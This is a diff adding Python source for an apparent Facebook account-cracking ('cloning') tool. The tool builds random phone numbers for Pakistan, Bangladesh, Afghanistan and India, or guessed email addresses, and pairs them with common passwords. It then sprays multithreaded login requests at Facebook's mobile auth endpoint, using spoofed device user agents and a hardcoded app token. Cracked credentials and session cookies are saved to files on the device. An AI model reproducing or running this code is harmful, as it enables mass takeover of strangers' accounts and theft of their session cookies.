+                                        time.sleep(1)
+                                        menu()
+                                clear()
+                                print('[1] METHOD NEW (1)')
+                                print('[2] METHOD OLD/NEW (2)')
+                                print('[3] METHOD OLD (3)')
+                                linex()
+                                mthd=input(' CHOOSE : ')
+                                linex()
+                                clear()
+                                plist = []
+                                try:
+                                        ps_limit = int(input(' HOW MANY PASSWORDS DO YOU WANT TO ADD ? '))
+                                except:
+                                        ps_limit =1
+                                linex()
+                                clear() #OPEN SOURCE PUBLISHED BY HEX+
+                                print('\033[1;32m EXAMPLE : first last,firtslast,first123')
+                                linex()
+                                for i in range(ps_limit):
+                                        plist.append(input(f' PUT PASSWORD {i+1}: '))
+                                linex()
+                                clear()
+                                print(' DO YOU WENT SHOW COOKIES :? (Y/N): ')
+                                linex()
+                                cx=input(' CHOOSE : ')
+                                if cx in ['y','Y','yes','Yes','1']:
+                                        pcp.append('y')
+                                else:
+                                        pcp.append('n')
+                                with tred(max_workers=30) as crack_submit:
+                                        clear()
+                                        total_ids = str(len(fo))
+                                        
+                                        print(' TOTAL ACCOUNT : \033[1;32m'+total_ids+f' ')
+                                        print("\033[1;37m CRACKING STARTED...\033[1;37m")
+                                        linex()
+                                        for user in fo:
+                                                ids,names = user.split('|')
+                                                passlist = plist
+                                                if mthd in ['1','01']:
+                                                        crack_submit.submit(ffb,ids,names,passlist)
+                                                elif mthd in ['2','02']:
+                                                        crack_submit.submit(api,ids,names,passlist)
+                                                elif mthd in ['3','03']:
+                                                        crack_submit.submit(api1,ids,names,passlist)
+                                print('\033[1;37m')
+                                linex()
+                                print(' THE PROCESS HAS COMPLETED')
+                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                                linex()
+                                input(' PRESS ENTER TO BACK ')
+                                os.system('python usmi.py')
+                        elif xd in ['2','02']:
+                                clear()
+                                print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] Afghanistan cloning\n [4] India cloning\n [5] Gmail cloning\n [0] Back menu')
+                                linex()
+                                x=input(' Choose: ')
+                                if x in ['1','01']:
+                                        pak()
+                                elif x in ['2','02']:
+                                        bd()
+                                elif x in ['3','03']:
+                                        afg()
+                                elif x in ['4','04']:
+                                        ind()        
+                                elif x in ['5','05']:  
+                                        gmail()      
+                                else:
+                                        menu()
+                        elif xd in ['0','00']:
+                                exit()
+#        except requests.exceptions.ConnectionError:
+ #               print('\n NO INTERNET CONNECTION ...')
+  #              exit()
+def pak():
+                user=[]
+                clear()
+                print('\033[1;31m CODE EXAMPLE : 0306,0315,0335,0345')
+                code = input('\033[1;37m PUT CODE: ')
+                try:
+                        limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+                with tred(max_workers=30) as TRT:     
+                        clear()
+                        
+                        tl = str(len(user))
+                        print('[+] Total accounts: \033[1;97m'+tl)
+                        print('[+] Select code: \033[1;97m '+code)
+                        print('[+] Process has been started \033[1;97m')
+                        linex()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,'khankhan','malik123','kingkhan','baloch123','pak123','khan123']
+                                TRT.submit(rndm,ids,passlist)
+                print('\033[1;37m')
+                linex()
+                print(' THE PROCESS HAS COMPLETED') #OPEN SOURCE PUBLISHED BY HEX+
+                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                linex()
+                input(' PRESS ENTER TO BACK ')
+                os.system('python anox786.py')
+def bd():
+                user=[]
+                clear()
+                print('\033[1;31m CODE EXAMPLE : 017,016,018')
+                code = input('\033[1;37m PUT CODE: ')
+                try:
+                        limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+                with tred(max_workers=30) as TRT:     
+                        clear()
+                        
+                        tl = str(len(user))
+                        print('[+] Total accounts: \033[1;97m'+tl)
+                        print('[+] Select code: \033[1;97m '+code)
+                        print('[+] Process has been started \033[1;97m')
+                        linex()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,'57575751','5039200','free fire','freefire','57273200']
+                                TRT.submit(rndm,ids,passlist)
+                print('\033[1;37m')
+                linex()
+                print(' THE PROCESS HAS COMPLETED')
+                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                linex()
+                input(' PRESS ENTER TO BACK ')
+                os.system('python anox786.py')
+
+def afg():
+                user=[]
+                clear()
+                print('\033[1;31m CODE EXAMPLE : 9377,9379,9374')
+                code = input('\033[1;37m PUT CODE: ')
+                try:
+                        limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+                with tred(max_workers=30) as TRT:     
+                        clear()
+                        
+                        tl = str(len(user))
+                        print('[+] Total accounts: \033[1;97m'+tl)
+                        print('[+] Select code: \033[1;97m '+code)
+                        print('[+] Process has been started \033[1;97m')
+                        linex()
+                        for psx in user: #OPEN SOURCE PUBLISHED BY HEX+
+                                ids = code+psx
+                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
+                                TRT.submit(rndm,ids,passlist)
+                print('\033[1;37m')
+                linex()
+                print(' THE PROCESS HAS COMPLETED')
+                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                linex()
+                input(' PRESS ENTER TO BACK ')
+                os.system('python anox786.py')
+def ind():
+                user=[]
+                clear()
+                print('\033[1;31m CODE EXAMPLE : 91637, 91831, 91805etc')
+                code = input('\033[1;37m PUT CODE: ')
+                try:
+                        limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+                with tred(max_workers=30) as TRT:     
+                        clear()
+                        
+                        tl = str(len(user))
+                        print('[+] Total accounts: \033[1;97m'+tl)
+                        print('[+] Select code: \033[1;97m '+code)
+                        print('[+] Process has been started \033[1;97m')
+                        linex()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,'59039200','57273200','57575751','123123']
+                                TRT.submit(rndm,ids,passlist)
+                print('\033[1;37m')
+                linex()
+                print(' THE PROCESS HAS COMPLETED')
+                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                linex()
+                input(' PRESS ENTER TO BACK ')
+                os.system('python anox786.py')
+                
+def gmail():
+                os.system('rm -rf .re.txt')
+                clear()
+                print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
+                linex()
+                first = input(' Put first name: ')
+                linex()
+                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
+                linex()
+                last = input(' Put last name: ')
+                linex()
+                print(' Example: @gmail.com , @yahoo.com etc...')
+                linex()
+                domain = input(' domain: ')
+                linex()
+                try:
+                        limit=int(input(' Put limit: '))
+                except ValueError:
+                        limit = 5000
+                linex()
+                print(' Getting gmails...')
+                lists = ['3','4']
+                for xd in range(limit):
+                        lchoice = random.choice(lists)
+                        if '3' in lchoice:
+                                mail = ''.join(random.choice(string.digits) for _ in range(3))
+                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                        else:
+                                mail = ''.join(random.choice(string.digits) for _ in range(4))
+                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                        fo = open('.re.txt', 'r').read().splitlines()
+                with tred(max_workers=30) as ZAIN:
+                        total = str(len(fo))
+                        clear()
+                        print(' Total account : \033[1;32m'+total)
+                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
+                        linex()
+                        for user in fo:
+                                ids,names = user.split('|')
+                                first_name = names.rsplit(' ')[0]
+                                try:
+                                        last_name = names.rsplit(' ')[1]
+                                except IndexError:
+                                        last_name = 'Khan'
+                                fs = first_name.lower()
+                                ls = last_name.lower()
+                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
+                                ZAIN.submit(rndm,ids,passlist)
+                print('\033[1;37m')
+                linex()
+                print(' The process has completed')
+                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                linex()
+                input(' Press enter to back ')
+                os.system('python ANOX786.py')
+                
+#------
+def ffb(ids,names,passlist):
+        try:
+                global ok,loop,sim_id
+                sys.stdout.write('\r\r\033[1;37m [ANOX-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                fn = names.split(' ')[0]
+                try:
+                        ln = names.split(' ')[1]
+                except:
+                        ln = fn
+                for pw in passlist:
+                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+                        fbbv = str(random.randint(111111111,999999999))
+                        android_version = device['android_version']
+                        model = device['model']
+                        build = device['build']
+                        fblc = device['fblc']
+                        fbcr = sim_id
+                        fbmf = device['fbmf']
+                        fbbd = device['fbbd']
+                        fbdv = device['fbdv']
+                        fbsv = device['fbsv']
+                        fbca = device['fbca']
+                        fbdm = device['fbdm']
+                        fbfw = '1'
+                        fbrv = '0'
+                        fban = 'FB4A'
+                        fbpn = 'com.facebook.katana'
+                        en = random.choice(['en_US','en_GB'])
+                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
+                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
+                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/1.8.4;FBDM/{density=0.75,width=320,height=240};FBLC/ru_RU;FB_FW/1;FBCR/AT&amp-T;FBNP/com.facebook.katana;FBSV/2.1-update1;]"+"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.5,width=1440,height=2560};FBLC/en_US;FBCR/U.S.Cellular;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920R4;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/69.0.0.2075;FBBV/4027810;[FBAN/FB4A;FBAV/406.0.0.26.90;FBBV/456153944;FBDM/{density=1.865,width=720,height=1465};FBLC/pt_BR;FBRV/4578887127;FBCR/CLARO BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A035M;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
+                        random_seed = random.Random() #OPEN SOURCE PUBLISHED BY HEX-PLUS
+                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+                        device_id = str(uuid.uuid4())
+                        secure = str(uuid.uuid4())
+                        family = str(uuid.uuid4())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
+                        sim_serials = f'["{xd}"]'
+                        li = ['28','29','210']
+                        li2 = random.choice(li)
+                        j1 = ''.join(random.choice(digits) for _ in range(2))
+                        jazoest = li2+j1
+                        head = {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
+                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'pt_BR','client_country_code': 'BR','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
+			
+                        url = 'https://b-graph.facebook.com/auth/login'
+                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+                        po = requests.post(url,data=data,headers=head).json()
+                        if 'session_key' in po:
+                                        print('\r\r\033[1;32m [ANOX-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        #print("\r\r\033[1;33m Cookie: "+coki)
+                                        open('/sdcard/USMII-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/ANOX-420-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        oks.append(ids)
+                                        break
+                        elif twf in str(po):
+                                        if 'y' in pcp:
+                                                print('\r\r \033[1;34m[USMII-2F] '+ids+' | '+pas)
+                                                twf.append(ids)
+                                                break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                        if 'y' in pcp:
+                                                print('\r\r\x1b[1;31m [ALONE-ANOX-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/anox-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                break
+                                                cps.append(ids)
+                                        else:
+                                                open('/sdcard/ANOX-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                break
+                                                cps.append(ids)
+                        else:
+                                        continue
+                loop+=1
+        except Exception as e:
+                pass
+xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
+def api(ids,names,passlist):
+        try:
+                global ok,loop,sim_id
+                sys.stdout.write('\r\r\033[1;37m [ANOX-RUNING ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                fn = names.split(' ')[0]
+                try:
+                        ln = names.split(' ')[1]
+                except:
+                        ln = fn
+                for pw in passlist:
+                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+                        fbbv = str(random.randint(111111111,999999999))
+                        android_version = device['android_version']
+                        model = device['model']
+                        build = device['build']
+                        fblc = device['fblc']
+                        fbcr = sim_id
+                        fbmf = device['fbmf']
+                        fbbd = device['fbbd']
+                        fbdv = device['fbdv']
+                        fbsv = device['fbsv']
+                        fbca = device['fbca']
+                        fbdm = device['fbdm']
+                        fbfw = '1'
+                        fbrv = '0'
+                        fban = 'FB4A' #OPEN SOURCE PUBLISHED BY HEX+
+                        fbpn = 'com.facebook.katana'
+                        en = random.choice(['en_US','en_GB'])
+                        motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
+                        mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
+                        mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
+                        bbbb = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1'])
+                        mmmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
+                        mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
+                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
+                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
